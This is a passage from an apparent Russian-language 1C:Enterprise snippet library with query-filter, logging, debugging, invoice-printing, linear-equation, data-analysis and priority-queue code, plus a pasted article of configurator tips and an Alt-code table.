    ИначеЕсли ЭлОтбора.ВидСравнения = ВидСравнения.ВСпискеПоИерархии Тогда
        УсловиеОтбора = "" В ИЕРАРХИИ (&"" + ЭлОтбора.Имя + "")"";
        ЗапросДанныхРегистра.УстановитьПараметр(ЭлОтбора.Имя, ЭлОтбора.Значение);
    ИначеЕсли ЭлОтбора.ВидСравнения = ВидСравнения.Интервал Тогда
        УсловиеОтбора = "" МЕЖДУ &"" + ЭлОтбора.Имя+""ЗначениеС И &"" + ЭлОтбора.Имя+""ЗначениеПо"";
        ЗапросДанныхРегистра.УстановитьПараметр(ЭлОтбора.Имя+""ЗначениеС"", ЭлОтбора.ЗначениеС);
        ЗапросДанныхРегистра.УстановитьПараметр(ЭлОтбора.Имя+""ЗначениеПо"", ЭлОтбора.ЗначениеПо);
    ИначеЕсли ЭлОтбора.ВидСравнения = ВидСравнения.ИнтервалВключаяГраницы Тогда
        УсловиеОтбора = "" "" + ЭлОтбора.Имя + "" >= &""+ЭлОтбора.Имя+""ЗначениеС И "" + ЭлОтбора.Имя + "" <= &""+ЭлОтбора.Имя+""ЗначениеПо "";
        ЗапросДанныхРегистра.УстановитьПараметр(ЭлОтбора.Имя+""ЗначениеС"", ЭлОтбора.ЗначениеС);
        ЗапросДанныхРегистра.УстановитьПараметр(ЭлОтбора.Имя+""ЗначениеПо"", ЭлОтбора.ЗначениеПо);
    ИначеЕсли ЭлОтбора.ВидСравнения = ВидСравнения.ИнтервалВключаяНачало Тогда
        УсловиеОтбора = "" "" + ЭлОтбора.Имя + "" >= &""+ЭлОтбора.Имя+""ЗначениеС И "" + ЭлОтбора.Имя + "" < &""+ЭлОтбора.Имя+""ЗначениеПо "";
        ЗапросДанныхРегистра.УстановитьПараметр(ЭлОтбора.Имя+""ЗначениеС"", ЭлОтбора.ЗначениеС);
        ЗапросДанныхРегистра.УстановитьПараметр(ЭлОтбора.Имя+""ЗначениеПо"", ЭлОтбора.ЗначениеПо);
    ИначеЕсли ЭлОтбора.ВидСравнения = ВидСравнения.ИнтервалВключаяОкончание Тогда
        УсловиеОтбора = "" "" + ЭлОтбора.Имя + "" > &""+ЭлОтбора.Имя+""ЗначениеС И "" + ЭлОтбора.Имя + "" <= &""+ЭлОтбора.Имя+""ЗначениеПо "";
        ЗапросДанныхРегистра.УстановитьПараметр(ЭлОтбора.Имя+""ЗначениеС"", ЭлОтбора.ЗначениеС);
        ЗапросДанныхРегистра.УстановитьПараметр(ЭлОтбора.Имя+""ЗначениеПо"", ЭлОтбора.ЗначениеПо);
    ИначеЕсли ЭлОтбора.ВидСравнения = ВидСравнения.Меньше Тогда
        УсловиеОтбора = "" < (&"" + ЭлОтбора.Имя + "")"";
        ЗапросДанныхРегистра.УстановитьПараметр(ЭлОтбора.Имя, ЭлОтбора.Значение);
    ИначеЕсли ЭлОтбора.ВидСравнения = ВидСравнения.МеньшеИлиРавно Тогда
        УсловиеОтбора = "" <= (&"" + ЭлОтбора.Имя + "")"";
        ЗапросДанныхРегистра.УстановитьПараметр(ЭлОтбора.Имя, ЭлОтбора.Значение);
    ИначеЕсли ЭлОтбора.ВидСравнения = ВидСравнения.НеВИерархии Тогда
        УсловиеОтбора = "" НЕ В ИЕРАРХИИ (&"" + ЭлОтбора.Имя + "")"";
        ЗапросДанныхРегистра.УстановитьПараметр(ЭлОтбора.Имя, ЭлОтбора.Значение);
    ИначеЕсли ЭлОтбора.ВидСравнения = ВидСравнения.НеВСписке Тогда
        УсловиеОтбора = "" НЕ В (&"" + ЭлОтбора.Имя + "")"";
        ЗапросДанныхРегистра.УстановитьПараметр(ЭлОтбора.Имя, ЭлОтбора.Значение);
    ИначеЕсли ЭлОтбора.ВидСравнения = ВидСравнения.НеВСпискеПоИерархии Тогда
        УсловиеОтбора = "" НЕ В ИЕРАРХИИ (&"" + ЭлОтбора.Имя + "")"";
        ЗапросДанныхРегистра.УстановитьПараметр(ЭлОтбора.Имя, ЭлОтбора.Значение);
    ИначеЕсли ЭлОтбора.ВидСравнения = ВидСравнения.НеРавно Тогда
        УсловиеОтбора = "" <> (&"" + ЭлОтбора.Имя + "")"";
        ЗапросДанныхРегистра.УстановитьПараметр(ЭлОтбора.Имя, ЭлОтбора.Значение);
    ИначеЕсли ЭлОтбора.ВидСравнения = ВидСравнения.НеСодержит Тогда
        УсловиеОтбора = "" НЕ ПОДОБНО (&"" + ЭлОтбора.Имя + "")"";
        ЗапросДанныхРегистра.УстановитьПараметр(ЭлОтбора.Имя, ЭлОтбора.Значение);
    ИначеЕсли ЭлОтбора.ВидСравнения = ВидСравнения.Равно Тогда
        УсловиеОтбора = "" = (&"" + ЭлОтбора.Имя + "")"";
        ЗапросДанныхРегистра.УстановитьПараметр(ЭлОтбора.Имя, ЭлОтбора.Значение);
    ИначеЕсли ЭлОтбора.ВидСравнения = ВидСравнения.Содержит Тогда
        УсловиеОтбора = "" ПОДОБНО (&"" + ЭлОтбора.Имя + "")"";
        ЗапросДанныхРегистра.УстановитьПараметр(ЭлОтбора.Имя, ЭлОтбора.Значение);
    КонецЕсли;
     
    ТекстОтбора = ТекстОтбора +
        УсловиеОтбора;
     
КонецФункции

// Универсальная функция для проверки наличия свойств у значения любого типа данных
// Переменные:
// 1. Переменная - переменная любого типа, для которой необходимо проверить наличие свойства
// 2. ИмяСвойства - переменная типа ""Строка"", содержащая искомое свойства
// 
Функция СодержитСвойство(Переменная, ИмяСвойства) Экспорт
	
	// Инициализируем структуру для теста с ключом (значение переменной ""ИмяСвойства"") и значением произвольного GUID'а
	GUIDПроверка = Новый УникальныйИдентификатор;
	СтруктураПроверка = Новый Структура;
	СтруктураПроверка.Вставить(ИмяСвойства, GUIDПроверка);
	
	ЗаполнитьЗначенияСвойств(СтруктураПроверка, Переменная);
	// Если значение для свойства структуры осталось NULL, то искомое свойство не найдено, и наоборот.
	Если СтруктураПроверка[ИмяСвойства] = GUIDПроверка Тогда
		Возврат Ложь;
	Иначе
		Возврат Истина;
	КонецЕсли;

КонецФункции"}
},
{0,
{"ТестСообщение (сохраняя в файл)",0,0,"","Процедура ТестСообщение(пПуть = ""C:\"", пИмяФайла = ""1C_Test"")
	
	ТекДата 		= ТекущаяДата();
	ТекДатаСтрока 	= Формат(ТекДата, ""ДФ='yyyy-MM-dd HH-mm-ss'"");
	Пользователь 	= ИмяПользователя();
	Инфо 			= """";
	
	ТекстТест 		= Пользователь + ?(НЕ ПустаяСтрока(Инфо), "" "" + Инфо + "" "", """") + ТекДатаСтрока;
	Путь 			= пПуть + пИмяФайла + ""_"" + ТекДатаСтрока + "".txt""; // Путь сохранения файла
	ТекстДок 		= Новый ТекстовыйДокумент;
	
	ТекстДок.ДобавитьСтроку(ТекстТест);
	ТекстДок.Записать(Путь);
	ТекстДок 		= Неопределено;
	
КонецПроцедуры"}
},
{2,
{"Запись журнала регистрации",1,0,"",""},
{0,
{"ЗаписьЖурналаРегистрации",0,0,"","ЗаписьЖурналаРегистрации(""Категория.Метаданные"", УровеньЖурналаРегистрации.Информация,, Ссылка, СообщениеОшибки);"}
},
{0,
{"ЗаписьЖурналаРегистрации НаСервереБезКонтекста",0,0,"","&НаСервереБезКонтекста
Процедура ЗаписьЖурналаРегистрацииНаСервере(пСсылка, пСообщениеОшибки = """")
	
	ЗаписьЖурналаРегистрации(""Категория.Метаданные"", УровеньЖурналаРегистрации.Информация,, пСсылка, пСообщениеОшибки);
	
КонецПроцедуры // ЗаписьЖурналаРегистрацииНаСервере()
"}
}
},
{2,
{"Отладка",1,0,"",""},
{0,
{"Сообщения для отладки",0,0,"Отлад[ка]","Сообщить(Формат(ТекущаяДата(), ""ДФ='yyyy-MM-dd_HH-mm-ss'"") + ""_Отладка""); // АйТи КучеровРМ <?"""", ДатаВремя, """">"}
},
{0,
{"Сообщения для отладки (3 шт) (в начало, середину, конец)",0,0,"Отлад[ка]","Сообщить(Формат(ТекущаяДата(), ""ДФ='yyyy-MM-dd_HH-mm-ss'"") + ""_Отладка_1""); // АйТи КучеровРМ <?"""", ДатаВремя, """">
Сообщить(Формат(ТекущаяДата(), ""ДФ='yyyy-MM-dd_HH-mm-ss'"") + ""_Отладка_2""); // АйТи КучеровРМ <?"""", ДатаВремя, """">
Сообщить(Формат(ТекущаяДата(), ""ДФ='yyyy-MM-dd_HH-mm-ss'"") + ""_Отладка_3""); // АйТи КучеровРМ <?"""", ДатаВремя, """">"}
}
},
{1,
{"Файлы",1,0,"",""},
{0,
{"НайтиФайлы",0,0,"","лНайденныеФайлы 	= НайтиФайлы(ПутьККаталогу);"}
}
},
{2,
{"Полезное инфо (фишки, справочная инфо, полезное)",1,0,"",""},
{0,
{"Фишечки-рюшечки",0,0,"","Фишечки-рюшечки-плюшечки
https://infostart.ru/public/1150043/?utm_source=soc&utm_campaign=vk
Публикация № 1150043 
За годы работы с 1С собрался определенный багаж хитростей, который позволяет разрабатывать быстрее/эффективнее/качественнее. Поделюсь ими в данной статье. 
Для начала немножко архитектурных решений...
Использование справочника с предопределенными объектами вместо НайтиПоНаименованию
Буквально на днях столкнулся с тем, что для кого-то такой подход является откровением, поэтому опишу его здесь. Итак, если необходимо в коде получить доступ к какому-то элементу справочника, то решение в лоб - использовать методы НайтиПоНаименованию и НайтиПоКоду. У данных методов есть один большой недостаток - изменение кода или наименования привод к неработоспособности механизма. А в типовых конфигурациях к тому же не всегда есть код у элемента справочника. Поэтому данный способ подходит для каких-то одноразовых обработок, а не механизма в целом.
Чтобы сделать более универсально, создаем справочник. Назовем его, например, ""Настройки"". У справочника создаем один реквизит - ""Значение"". Тип реквизита составной, отмечаем примитивные типы и ""Любая ссылка"". Теперь, чтобы хранить какое-то значение, создаем предопределенный элемент этого справочника. Назовем его, например, ""ТипНоменклатуры"". В нем мы будем хранить ссылку на тип номенклатуры, с которым по коду будем что-нибудь делать. В режиме предприятия в этот элемент справочник проставим значение - наш особенный тип номенклатуры. Далее, в режиме конфигуратора обращаемся как Справочники.Настройки.ТипНоменклатуры.Значение. Тут и будет наша ссылка на тип номенклатуры. Недостатки данного подхода
•	невозможность работать с расширениями (не создаются предопределенные элементы);
•	если получаем тип булево, то необходимо обязательно явно проверять его на истину (Если Справочники.Настройки.ИспользоватьНовыйМеханизм.Значение = Истина Тогда) потому, что если не задать значение в режиме предприятия, то значение будет Неопределено.
Если надо через расширение, то можно попробовать сделать такой фокус через регистр сведений.
Дополнительная роль
Как часто у вас бывало, что кодите какой-то супер механизм, протестили, все замечательно, накатываете на продакшн, приходите к директору демонстрировать и... Недостаточно прав для работы с таблицей РегистрСведений.КурлыкКурлык. ""А кто же будет тестировать под правами директора?"" - скажете вы, но тут же вспомните пару таких же своих косяков в прошлом месяце. Ок, сам неумный, надо было тестировать, но что дальше-то делать? Всех выгонять? Динамическое обновление? Прийти завтра? 
Для решения такой задачи была придумана специальная роль. Помнится мы ее назвали РезервнаяРоль. Суть этой роли в том, что у нее стоит разрешение на все вновь создаваемые объекты, но отключены все текущие роли. В итоге, когда случается описанный выше конфуз, просто добавляем директору эту роль, перезаходим, демонстрируем. А к следующему релизу исправим роль директора, и там уж точно не забудем протестировать под его учеткой.
Ну и недостатки, как же без них:
•	Необходимо периодически вручную убирать доступ у этой роли к уже исправленным в продакшене метаданным;
•	Необходимо мониторить, чтобы эта роль была включена у пользователя только тогда, когда это нужно;
•	Неудобно использовать, если ломается не у единичных пользователей, а у основной массы.
Ну и немного хитростей при работе с конфигуратором
•	Удивительно, но далеко не все знают, что глобальный поиск можно остановить сочетанием клавиш Ctrl+Break. Правда, в версиях около 8.3.12 работает с перебоями.
•	Чтобы поставить знак & - необязательно переключаться на английскую раскладку! Просто зажмите кнопку Alt и на NUM-клавиатуре наберите 38. Отпустите Alt. Alt+35 дает знак решетки. Хотите узнать больше сочетаний - загуглите Alt символы. Я пока выучил только эти две комбинации
•	Не можете найти какая форма открывается по ссылке где-нибудь в интерфейсе? Делается это легко, подготавливаем в режиме предприятия окна так, чтобы первое нажатие на ссылку/кнопку/поле делало именно то, что мы не можем найти. В режиме конфигуратора в меню Отладка нажимаем Остановить. Бежим в режим предприятия, пока не вывалились в обработчик ожидания, и жмем эту ссылку/кнопку/поле. В итоге мы оказываемся в точке останова в первой же строке, которая выполняется по событию нажатия. В новых конфигурациях, зачастую, этой первой строкой становится проверка на резервное копирование, которая подвязана на обработчик ожидания.
•	Если отлаживаете большой кусок кода с ветвлениями и не хотите пошагово идти по коду, чтобы понять, какие условия отрабатывают - включите замер производительности. Рядом со строками, которые исполнялись будет стоять время.
•	Для отладки фоновых заданий в типовой конфигурации можно либо в меню подключений установить автоматическое подключение фоновых заданий, либо запускать отладку с ключом РежимОтладки. В последнем случае все фоновые задания будут запускаться в текущем сеансе.
 
•	Уже давно в конфигураторе есть возможность подсвечивать слова, которые совпадают со словом под курсором, но почему-то по умолчанию подсвечивается белым цветом, т.е. вообще не подсвечивается. Исправляем цвет у «Текущий идентификатор».
"}
},
{0,
{"Alt-код (#=35, &=38)",0,0,"","Alt-код 	Символ 	Alt-код 	Символ 	Alt-код 	Символ 	Alt-код 	Символ 	Alt-код 	Символ 	Alt-код 	Символ 	Alt-код 	Символ
1 	☺ 	21 	§ 	41 	) 	61 	= 	81 	Q 	101 	e 	121 	y
2 	☻ 	22 	▬ 	42 	* 	62 	> 	82 	R 	102 	f 	122 	z
3 	♥ 	23 	↨ 	43 	+ 	63 	 ? 	83 	S 	103 	g 	123 	{
4 	♦ 	24 	↑ 	44 	, 	64 	@ 	84 	T 	104 	h 	124 	|
5 	♣ 	25 	↓ 	45 	- 	65 	A 	85 	U 	105 	i 	125 	}
6 	♠ 	26 	→ 	46 	. 	66 	B 	86 	V 	106 	j 	126 	~
7 	• 	27 	← 	47 	/ 	67 	C 	87 	W 	107 	k 	127 	⌂
8 	◘ 	28 	∟ 	48 	0 	68 	D 	88 	X 	108 	l 	128	А
9 	○ 	29 	↔ 	49 	1 	69 	E 	89 	Y 	109 	m 	129 	Б
10 	◙ 	30 	▲ 	50 	2 	70 	F 	90 	Z 	110 	n 	130 	В
11 	♂ 	31 	▼ 	51 	3 	71 	G 	91 	[ 	111 	o 	131 	Г
12 	♀ 	32 	<пробел> 	52 	4	72 	H 	92 	\ 	112 	p 	132 	Д
13 	♪ 	33 	 ! 	53 	5 	73 	I 	93 	] 	113 	q 		
14 	♫ 	34 	"" 	54 	6 	74 	J 	94 	^ 	114 	r 		
15 	☼ 	35 	# 	55 	7 	75 	K 	95 	_ 	115 	s 		
16 	► 	36 	$ 	56 	8 	76 	L 	96 	` 	116 	t 		
17 	◄ 	37 	 % 	57 	9 	77 	M 	97 	a 	117 	u 		
18 	↕ 	38 	& 	58 	: 	78 	N 	98 	b 	118 	v 		
19 	‼ 	39 	' 	59 	; 	79 	O 	99 	c 	119 	w 		
20 	¶ 	40 	(	60 	< 	80 	P 	100 	d 	120 	x 	"}
}
},
{0,
{"УПД  / Счет-фактура (Номер документа)",0,0,"","НомерСф 		= """";
ПервыйПроход 	= Истина;
для Каждого СТрокаТЧ из ДанныеПечати.Ссылка.ДокументыОснования Цикл
	
	СчетаФактуры = Документы.СчетФактураВыданный.СчетаФактурыПоОснованию(СТрокаТЧ.ДокументОснование);
	если СчетаФактуры.Количество() > 0 Тогда
		НомерСф    = НомерСф + ?(ПервыйПроход,"""",""/"") 
		+ ""УПД от""+Символы.НПП+Формат(СчетаФактуры[0].Дата,""ДФ=dd.MM.yyyy"")+Символы.НПП+""№ ""+СокрЛП(ПрефиксацияОбъектовКлиентСервер.НомерНаПечать(СчетаФактуры[0].Номер,истина,истина)) 
		+ 
		?(ЗначениеЗаполнено(СТрокаТЧ.ДокументОснование.ЗаказКлиента.АйТи_НомерВходящегоДокумента),"", "" + СТрокаТЧ.ДокументОснование.ЗаказКлиента.АйТи_НомерВходящегоДокумента,"""");
		Если ПроставитьНомердату Тогда
			РеквизитыМакета.Вставить(""Пункт0_2"", Формат(СчетаФактуры[0].Дата, ""ДФ=dd.MM.yyyy""));
			КомментарийЗаказа = СТрокаТЧ.ДокументОснование.ЗаказКлиента.Комментарий;
			РеквизитыМакета.Вставить(""Пункт7_2"", КомментарийЗаказа); 
			РеквизитыМакета.Вставить(""Пункт0_3"", ПрефиксацияОбъектовКлиентСервер.НомерНаПечать(СчетаФактуры[0].Номер,истина,истина));
		КонецЕсли;
	КонецЕсли;
	ПервыйПроход = ложь;
	
КонецЦикла;"}
},
{4,
{"Математические решения (АнализДанных, РасчетСистемЛинейныхУравнений)",1,0,"",""},
{0,
{"Расчет систем линейных уравнений (РасчетСистемЛинейныхУравнений)",0,0,"","Пример использования объекта Расчет систем линейных уравнений.
Начиная с версии платформы 8.3.14.1565 в 1С:Предприятие стал доступен объект для решения системы линейных уравнений. Следует предположить, что данный функционал не вызвал значительного интереса, так как  я не нашел на infostart ни одного упоминания, относящегося к данному предмету. Поиск через Яндекс вывел на статью ""Механизм решения систем линейных алгебраических уравнений"", которая всем хороша, за исключением того, что не содержит примера применения нового класса РасчетСистемЛинейныхУравнений. Этот пробел я и постараюсь восполнить. Решать будем систему из трех уравнений, которая вынесена в заголовок статьи.

                                                           x  -3y+5z  =-10

                                                         2x + y  - z   =5

                                                         4x+2y+3z   =5

На первом шаге подготовим две таблицы значений. В одной будем хранить коэффициенты из левой части, а в другой свободные члены системы уравнений.

уравнение	номер	ч
1	1	1
1	2	-3
1	3	5
2	1	2
2	2	1
2	3	-1
3	1	4
3	2	2
3	3	3

уравнение	ч
1	-10
2	5
3	5

Каждая из таблиц содержит колонку уравнение, в которой указывается номер уравнения , а так же колонку Ч, в которую заносятся значения коэффициентов. Кроме этого, таблица с коэффициентами из левой части решаемой системы содержит колонку номер, для указания номера переменной, к которой относится данный коэффициент. Упростим себе жизнь и и напишем две процедуры для заполнения данных таблиц.

//-----------------------------------------------------------------
// куда - таблица значений, в которую добавляются свободные члены
// что - строка со значениями коэффициентов из правой части уравнения,
//       которые разделены ';'

Функция ДобавитьСвободныеЧлены(куда,что)
	данные=СтрРазделить(что,"";"",ЛОЖЬ);
	инд=1;
	для каждого к из данные цикл
		запись=куда.Добавить();
		запись.уравнение=инд  ;
		инд=инд+1             ;
		запись.Ч=число(к)     ;
	конеццикла;	
	
	возврат куда;
КонецФункции	


//--------------------------------------------------------------------------------------------
// куда - таблица значений, в которую добавляются коэффициенты уравнения из левой части
// что - строка со значениями коэффициентов,которые разделены ';'
// номер_уравнения - номер уравнения, которому относятся коэффициенты


Функция ДобавитьКоэффициенты(куда,что,номер_уравнения)
	данные=СтрРазделить(что,"";"",ЛОЖЬ);
	инд=1;
	для каждого к из данные цикл
		запись=куда.Добавить()           ;
		запись.уравнение=номер_уравнения ;
		запись.номер=инд                 ;
		инд=инд+1                        ;
		запись.Ч=число(к)                ;
	конеццикла;	
	
	возврат куда;
КонецФункции	
Теперь выполним подготовительные процедуры.

   ТипЧисло=новый ОписаниеТипов(""Число"");
   
   СвободныеЧлены=новый ТаблицаЗначений                     ;
   СвободныеЧлены.Колонки.Добавить(""уравнение"",ТипЧисло)    ;
   СвободныеЧлены.Колонки.Добавить(""Ч"",ТипЧисло)            ;
   //заносим в таблицу значения свободных членов
   ДобавитьСвободныеЧлены(СвободныеЧлены,""-10;5;5"")         ;
   
   Коэффициенты=новый ТаблицаЗначений                 ;
   Коэффициенты.Колонки.Добавить(""уравнение"",ТипЧисло);
   Коэффициенты.Колонки.Добавить(""номер"",ТипЧисло)    ;
   Коэффициенты.Колонки.Добавить(""Ч"",ТипЧисло)        ;
   //заносим значения коэффициентов из левой части
   ДобавитьКоэффициенты(Коэффициенты,""1;-3;5"",1)      ;
   ДобавитьКоэффициенты(Коэффициенты,""2;1;-1"",2)      ;
   ДобавитьКоэффициенты(Коэффициенты,""4;2;3"",3)       ;
На следующем шаге переходим к работе с объектом РасчетСистемЛинейныхУравнений. У него есть два свойства, первое - ИсточникДанныхУзлов, через которое передаются значения свободных коэффициентов,  и свойство ИсточникДанныхСвязей для передачи значений коэффициентов из левой части системы линейных уравнений. Отметим, что кроме сформированных таблиц мы указываем имена колонок, в которых хранится номер уравнения и номер переменной.

   Расчет=новый РасчетСистемЛинейныхУравнений    ;
   //коэффициенты из левой части уравнения
   Расчет.ИсточникДанныхСвязей=Коэффициенты     ;
   Расчет.КолонкаУравненияВСвязях =""уравнение""  ;           
   Расчет.КолонкаПеременныеВСвязях=""номер""      ;
   //коэффициенты из правой части уравнения
   Расчет.ИсточникДанныхУзлов=СвободныеЧлены        ;
   Расчет.КолонкаУравненияВУзлах=""уравнение""        ;
Заключительный штрих. Для того чтобы все заработало надо добавить ОписанияСистемЛинейныхУравнений в коллекцию ОписанияСистем  класса РасчетСистемЛинейныхУравнений.

   описание=Расчет.ОписанияСистем.Добавить();
   описание.КолонкаКоэффициентовВСвязях=""Ч"" ;
   описание.КолонкаКоэффициентовВУзлах =""Ч"" ; 
И наконец непосредственный расчет.

   ответ=Расчет.РассчитатьСистемыЛинейныхУравнений() ;
   для каждого запись из ответ цикл
	   сообщить(запись.Решение1);
   конеццикла;	   
   

Точное решение для данной системы : 

x=1;

y=2;

z=-1

Убедиться в этом можно непосредственной подстановкой. Программа дает ответ с некоторой точностью, что обусловлено применяемым итерационным алгоритмом."}
},
{0,
{"Анализ данных: Типы",0,0,"","В справке находится в: Общие объекты -> Анализ данных
Тип производимого анализа. Одно из:
Тип(""АнализДанныхКластеризация"") Тип(""DataAnalysisClusterization"");
Тип(""АнализДанныхПоискАссоциаций"") Тип(""DataAnalysisAssociationRules"");
Тип(""АнализДанныхПоискПоследовательностей"") Тип(""DataAnalysisSequentialPatterns"");
Тип(""АнализДанныхДеревоРешений"") Тип(""DataAnalysisDecisionTree"");
Тип(""АнализДанныхОбщаяСтатистика"") Тип(""DataAnalysisSummaryStatistics"")."}
},
{0,
{"АнализДанныхПоискАссоциаций",0,0,"","//Очищаем табличный документ на форме; 

Результат.Очистить();

//Запросом получаем данные о поступлениях товара; 

Запрос = Новый Запрос;
Запрос.Текст =
""ВЫБРАТЬ
|       	ПоступлениеТоваровУслугТовары.Ссылка КАК Ссылка,
|       	ПоступлениеТоваровУслугТовары.Номенклатура КАК Номенклатура
|ИЗ
|       	Документ.ПоступлениеТоваровУслуг.Товары КАК ПоступлениеТоваровУслугТовары"";

РезультатЗапроса = Запрос.Выполнить();

//Используем вспомогательный объект для вывода данных в результате анализа по поиску ассоциаций. 

Аналитика 					= Новый ПостроительОтчетаАнализаДанных;
Аналитика.ТипАнализа 		= Тип(""АнализДанныхПоискАссоциаций"");
Аналитика.ИсточникДанных 	= РезультатЗапроса;
Аналитика.Выполнить();
Аналитика.Вывести(Результат);
"}
},
{0,
{"АнализДанных: Общее",0,0,"","&НаСервере
Процедура СформироватьДанные()
	
	Результат.Очистить();
	Прогноз.Очистить();
	
	Запрос = Новый Запрос;
	Запрос.Текст = 
	""ВЫБРАТЬ
	| ВыручкаИСебестоимостьПродажОбороты.Регистратор,
	| ВыручкаИСебестоимостьПродажОбороты.Период,
	| ВыручкаИСебестоимостьПродажОбороты.АналитикаУчетаПоПартнерам.Партнер КАК Партнер,
	| ВыручкаИСебестоимостьПродажОбороты.АналитикаУчетаНоменклатуры.Номенклатура КАК Номенклатура,
	| ВыручкаИСебестоимостьПродажОбороты.СуммаВыручкиОборот КАК Сумма,
	| ВыручкаИСебестоимостьПродажОбороты.КоличествоОборот КАК Количество
	|ИЗ
	| РегистрНакопления.ВыручкаИСебестоимостьПродаж.Обороты(, , Регистратор, ) КАК ВыручкаИСебестоимостьПродажОбороты"";
	
	РезультатЗапроса = Запрос.Выполнить();
	
	Аналитика = Новый ПостроительОтчетаАнализаДанных;
	
	Аналитика.ИсточникДанных = РезультатЗапроса;
	Аналитика.ТипАнализа = Тип(ТипАнализа);
	
	Если Тип(ТипАнализа) = Тип(""АнализДанныхОбщаяСтатистика"") Тогда
		Аналитика.НастройкаКолонок.Регистратор.ТипКолонки = ТипКолонкиАнализаДанныхОбщаяСтатистика.НеИспользуемая;
	ИначеЕсли Тип(ТипАнализа) = Тип(""АнализДанныхДеревоРешений"") Тогда  
		Аналитика.НастройкаКолонок.Регистратор.ТипКолонки = ТипКолонкиАнализаДанныхДеревоРешений.НеИспользуемая;
		Аналитика.НастройкаКолонок.Партнер.ТипКолонки = ТипКолонкиАнализаДанныхДеревоРешений.Прогнозируемая;
		Аналитика.НастройкаКолонок.Номенклатура.ТипКолонки = ТипКолонкиАнализаДанныхДеревоРешений.НеИспользуемая;
		Аналитика.Параметры.МаксимальнаяГлубина.Значение = 100;
		Аналитика.Параметры.ТипУпрощения.Значение = ТипУпрощенияДереваРешений.НеУпрощать;
	ИначеЕсли Тип(ТипАнализа) = Тип(""АнализДанныхКластеризация"") Тогда
		Аналитика.НастройкаКолонок.Период.ТипКолонки = ТипКолонкиАнализаДанныхКластеризация.НеИспользуемая;
		Аналитика.НастройкаКолонок.Регистратор.ТипКолонки = ТипКолонкиАнализаДанныхКластеризация.НеИспользуемая;
		Аналитика.НастройкаКолонок.Партнер.ТипКолонки = ТипКолонкиАнализаДанныхКластеризация.Ключ;
		Аналитика.НастройкаКолонок.Номенклатура.ТипКолонки = ТипКолонкиАнализаДанныхКластеризация.ВходнаяИПрогнозируемая;
	ИначеЕсли Тип(ТипАнализа) = Тип(""АнализДанныхПоискПоследовательностей"") Тогда
		Аналитика.НастройкаКолонок.Регистратор.ТипКолонки = ТипКолонкиАнализаДанныхПоискПоследовательностей.НеИспользуемая;
		Аналитика.НастройкаКолонок.Номенклатура.ТипКолонки = ТипКолонкиАнализаДанныхПоискПоследовательностей.Элемент;
		Аналитика.НастройкаКолонок.Партнер.ТипКолонки = ТипКолонкиАнализаДанныхПоискПоследовательностей.Последовательность;
	ИначеЕсли Тип(ТипАнализа) = Тип(""АнализДанныхПоискАссоциаций"") Тогда
		Аналитика.НастройкаКолонок.Партнер.ТипКолонки = ТипКолонкиАнализаДанныхПоискАссоциаций.НеИспользуемая;
		Аналитика.НастройкаКолонок.Период.ТипКолонки = ТипКолонкиАнализаДанныхПоискАссоциаций.НеИспользуемая;
		Аналитика.НастройкаКолонок.Количество.ТипКолонки = ТипКолонкиАнализаДанныхПоискАссоциаций.НеИспользуемая;
		Аналитика.НастройкаКолонок.Сумма.ТипКолонки = ТипКолонкиАнализаДанныхПоискАссоциаций.НеИспользуемая;
	КонецЕсли;
	
	Аналитика.Выполнить();
	Аналитика.Вывести(Результат);
	
	Если Тип(ТипАнализа) = Тип(""АнализДанныхОбщаяСтатистика"") Тогда
		Возврат;
	КонецЕсли;
	
	МодельПрогноза = Аналитика.Результат.СоздатьМодельПрогноза();
	МодельПрогноза.ИсточникДанных = РезультатЗапроса;
	ТЗ = МодельПрогноза.Выполнить();
	
	Построитель = Новый ПостроительОтчета;
	Построитель.ИсточникДанных = Новый ОписаниеИсточникаДанных(ТЗ);
	Построитель.Выполнить();
	Построитель.Вывести(Прогноз);
	
КонецПроцедуры 

&НаКлиенте
Процедура Сформировать(Команда)
	
	Если ПустаяСтрока(ТипАнализа) Тогда
		Возврат;
	КонецЕсли;
	
	СформироватьДанные();
	
КонецПроцедуры
"}
}
},
{5,
{"Стек, Очередь и Приоритетную очередь (порядочность)",1,0,"",""},
{0,
{"ПриоритетнаяОчередь через массив",0,0,"","&НаКлиенте
Перем ПриоритетнаяОчередь;

&НаКлиенте
Функция ДобавитьЭлемент(Элемент)
    ПриоритетнаяОчередь.Добавить(Элемент);
    Всплытие(ПриоритетнаяОчередь.Количество() - 1);
КонецФункции

&НаКлиенте
Функция ИзвлечьМаксимум()
    Максимум = ПриоритетнаяОчередь[1];
    ИндексПоследнегоЭлемента = ПриоритетнаяОчередь.Количество() - 1;
    Рокировка(1, ИндексПоследнегоЭлемента);
    ПриоритетнаяОчередь.Удалить(ИндексПоследнегоЭлемента);
    Погружение(1);
    Возврат Максимум;
КонецФункции

&НаКлиенте
Процедура Всплытие(Знач ИндексЭлемента)
    Пока ИндексЭлемента > 1 И ПриоритетнаяОчередь[Цел(ИндексЭлемента / 2)] < ПриоритетнаяОчередь[ИндексЭлемента] Цикл
        ИндексРодительскогоЭлемента = Цел(ИндексЭлемента / 2);
        Рокировка(ИндексЭлемента, ИндексРодительскогоЭлемента);
        ИндексЭлемента = ИндексРодительскогоЭлемента;
    КонецЦикла;
КонецПроцедуры

&НаКлиенте
Процедура Погружение(Знач ИндексЭлемента)
    ИндексПоследнегоЭлемента = ПриоритетнаяОчередь.Количество() - 1;
    Пока ИндексЭлемента*2 <= ИндексПоследнегоЭлемента Цикл
        ИндексПервогоДочернегоЭлемента = ИндексЭлемента*2;
        ИндексВторогоДочернегоЭлемента = ИндексПервогоДочернегоЭлемента + 1;
        ИндексДочернегоЭлементаДляПогружения = ИндексПервогоДочернегоЭлемента;
        Если ИндексДочернегоЭлементаДляПогружения < ИндексПоследнегоЭлемента И ПриоритетнаяОчередь[ИндексВторогоДочернегоЭлемента] > ПриоритетнаяОчередь[ИндексПервогоДочернегоЭлемента] Тогда
            ИндексДочернегоЭлементаДляПогружения = ИндексВторогоДочернегоЭлемента;
        КонецЕсли;
        Если ПриоритетнаяОчередь[ИндексЭлемента] < ПриоритетнаяОчередь[ИндексДочернегоЭлементаДляПогружения] Тогда
            Рокировка(ИндексЭлемента, ИндексДочернегоЭлементаДляПогружения);
            ИндексЭлемента = ИндексДочернегоЭлементаДляПогружения;
        Иначе
            //погружение не требуется
            Прервать;
        КонецЕсли;
    КонецЦикла;
КонецПроцедуры

&НаКлиенте
Процедура Рокировка(ИндексПервогоЭлемента, ИндексВторогоЭлемента)
    ПервыйЭлемент = ПриоритетнаяОчередь[ИндексПервогоЭлемента];
